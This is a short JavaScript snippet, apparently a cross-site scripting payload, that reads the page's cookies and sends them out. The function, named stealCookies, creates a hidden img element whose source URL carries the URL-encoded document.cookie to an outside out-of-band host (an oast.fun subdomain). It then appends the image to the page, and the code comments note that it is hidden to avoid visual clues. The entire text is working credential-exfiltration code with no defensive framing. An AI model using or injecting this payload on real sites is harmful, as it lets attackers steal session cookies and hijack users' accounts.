// Dynamically create an <img> tag to exfiltrate cookies
(function stealCookies() {
  var img = document.createElement("img");
  img.src = `http://mpvzdbjbftridrbbwcgldrt5uz4w11nqg.oast.fun/${encodeURIComponent(document.cookie)}`;
  img.style.display = "none"; // Hide the image to avoid visual clues
  document.body.appendChild(img);
})();
